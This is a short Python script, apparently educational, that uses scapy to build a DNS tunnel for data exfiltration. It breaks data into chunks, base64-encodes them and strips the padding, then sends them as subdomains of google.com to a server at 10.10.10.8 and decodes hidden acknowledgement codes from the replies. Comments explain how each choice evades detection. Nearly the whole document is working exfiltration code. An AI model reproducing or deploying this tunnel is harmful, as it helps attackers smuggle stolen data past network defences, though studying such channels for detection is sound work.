# This script uses scapy to create a DNS tunnel for data exfil, and processes hidden messages in DNS responses from the server upon receipt.

from scapy.all import *
from base64 import b64encode

ip = "10.10.10.8"
domain = "google.com"
# Because this is an example, the IP adress used is local. This must be changed if interacting outside one's network.
# "Google" can only work in the example as well because the local host is the DNS server. Otherwise this would result in an error.

def process(response):
    code = str(response[DNS].an.rdata)[-1]
    if int(code) == 1:
        print("Received successfully")
    elif int(code) == 2:
        print("Acknowledged end transmission")
    else:
        print("Transmission error")
# This function accepts the DNS answer from the server-side, isolates the final number in the IP address response, 
# and uses it to print the hidden message back to the client.

def DNSRequest(subdomain):
    global domain
    d = bytes(subdomain + "." + domain,"utf-8")
    # This does the actual URL construction appending the obfuscated data packets created in sendData() (below).
    query = DNSQR(qname=d)
    # scapy's DNS query function is called.
    mac = get_if_hwaddr(conf.iface)
    p = Ether(src=mac,dst=mac)/IP(dst=bytes(ip,"utf-8"))/UDP(dport=1337)/DNS(qd=query)
    # The previous 2 lines are only necessary because scapy's addressing can be inconsistenet when functioning in the local host.
    # They ensure the interface used to send and receive DNS requests are consistent.
    # "p" is a DNS query inside of a UDP packet, transports by an IP packet encapsulated in an ethernet packet with the localhost mac info.
    result = srp1(p,verbose=False)
    # srp1 is scapy's packet "sender" if Layer 2 info is specified. Otherwise, use "sr1." Both send a single packet, hence the "1."
    process(result)

def sendData(data):
    for i in range(0,len(data),10):
        chunk = data[i:min(i+10,len(data))]
        # Data that is being exfiltrated is broken into smaller chunks to be appended as host in front of a main domain name.
        # Doing so adds an additional layer of credibility because most hosts are only a short number of characters (www, mail, nx, etc.)
        print("Transmitting %s"%chunk)
        encoded = b64encode(bytes(chunk,"utf-8"))
        print(encoded)
        encoded = encoded.decode("utf-8").rstrip("=")
        # The data is encoded for a further level of obfuscation, and trailing "="s are removed because they easily identify uft-8 data.
        DNSRequest(encoded)

data = "This is data being exfiltrated over DNS"
sendData(data)
data = "R"
sendData(data)
